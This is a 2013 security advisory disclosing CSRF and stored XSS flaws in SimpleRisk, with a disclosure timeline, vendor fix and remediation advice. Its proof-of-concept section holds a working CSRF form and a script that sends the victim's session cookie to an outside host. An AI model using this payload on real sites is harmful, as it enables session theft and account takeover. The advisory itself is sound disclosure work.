@@ -1,0 +1,140 @@
+1. *Advisory Information*
+
+Title: SimpleRisk v.20130915-01 CSRF-XSS Account Compromise
+Advisory ID: RS-2013-0001
+Date Published: 2013-09-30
+
+2. *Vulnerability Information*
+
+Type: Cross-Site Request Forgery (CSRF) [CWE-352, OWASP-A8], Cross-Site
+Scripting (XSS) [CWE-79, OWASP-A3]
+Impact: Full Account Compromise
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+Severity: High
+CVE-ID: CVE-2013-5748 (CSRF) and CVE-2013-5749 (non-httponly cookie)
+
+3. *Software Description*
+
+SimpleRisk a simple and free tool to perform risk management activities.
+Based entirely on open source technologies and sporting a Mozilla Public
+License 2.0, a SimpleRisk instance can be stood up in minutes and instantly
+provides the security professional with the ability to submit risks, plan
+mitigations, facilitate management reviews, prioritize for project
+planning, and track regular reviews. It is highly configurable and includes
+dynamic reporting and the ability to tweak risk formulas on the fly. It is
+under active development with new features being added all the time.
+SimpleRisk is truly Enterprise Risk Management simplified. [0]
+
+Homepage: http://www.simplerisk.org/
+Download:
+https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz
+
+4. *Vulnerability Description*
+
+Cross-Site Request Forgery (CSRF) and Stored Cross-Site Scripting (XSS)
+have been discovered within SimpleRisk version 20130915-01 leading to
+complete account compromise. The CSRF vulnerability is used to deliver the
+XSS payload which accesses the authenticated user's session cookies and
+transmits them to a third-party domain under the attacker's control. Once
+the attacker has the user's session cookie, the attacker can authenticate
+to the application as the user.
+
+5. *Vulnerable Packages*
+
+Only version 20130915-01 was tested which was the latest version at the
+time of writing.
+
+6. *Vendor Information, Solutions and Workarounds*
+
+SimpleRisk released version 20130916-001 to address the issue.
+
+7. *Credits*
+
+These vulnerabilities were discovered by Ryan Dewhurst -
+http://www.randomstorm.com/ - http://www.dewhurstsecurity.com/
+
+8. *Proof of Concept (PoC)*
+
+8.1 *Cross-Site Request Forgery (CSRF)*
+
+The following CSRF PoC submits a POST request to the
+prioritize_planning.php page with the XSS payload within the new_project
+parameter.
+
+----
+<html>
+  <body>
+    <form action="
+http://127.0.0.1/simplerisk/management/prioritize_planning.php";
+method="POST">
+      <input type="hidden" name="new&#95;project"
+value="<script&#32;src&#61;&#47;&#47;ethicalhack3r&#46;co&#46;uk&#47;files&#47;xss&#47;c&#46;j><&#47;script>"
+/>
+      <input type="hidden" name="add&#95;project" value="Add" />
+      <input type="hidden" name="projects" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+----
+
+8.2 *Stored Cross-Site Scripting (XSS)*
+
+The prioritize_planning.php page accepts user supplied input via the
+new_project POST parameter and then later outputs that data to the page
+without first being sanitised or encoded. The following code was used to
+inject JavaScript into the application's back-end database.
+
+Payload: <script src=//ethicalhack3r.co.uk/files/xss/c.j></script>
+Method: POST
+Parameter: new_project
+
+The c.j JavaScript file contained the following code which sends the user's
+authenticated session cookie to a third-party domain:
+
+document.write('<img src=//ethicalhack3r.co.uk/srx=' + document.cookie +
+'>');
+
+9. *Remediation*
+
+9.1 *Cross-Site Request Forgery (CSRF)*
+
+Set per page anti-csrf tokens (nonces) which are submitted with requests
+and then validated by the server. Please refer to OWASP's CSRF Prevention
+Cheat Sheet for further information. [1]
+
+9.2 *Cross-Site Scripting (XSS)*
+
+Properly sanitise and encode user supplied input and output. Please refer
+to OWASP's XSS Prevention Cheat Sheet for further information. [2]
+
+9.3 *Other Recommendations*
+
+. Add the httponly flag to the session cookie so that JavaScript's
+document.cookie can not access it. [3]
+. Set the Content Security Policy (CSP) header to whitelist where
+JavaScript is allowed to be loaded from. [4]
+. Set the X-XSS-Protection header to ensure the browser's XSS filtering is
+enabled. (only works for reflected XSS) [5]
+
+10. *Report Timeline*
+
+2013-09-16: SimpleRisk notified of issue.
+2013-09-16: SimpleRisk acknoledged issue.
+2013-09-16: SimpleRisk release new version.
+2013-09-30: Advisory released.
+
+11. *References*
+
+[0] http://www.simplerisk.org/
+[1]
+https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet
+[2]
+https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+[3] https://www.owasp.org/index.php/HttpOnly
+[4] https://www.owasp.org/index.php/Content_Security_Policy
+[5]
+https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#X-XSS-Protection
+[6] http://www.randomstorm.com/
+[7] http://www.dewhurstsecurity.com/
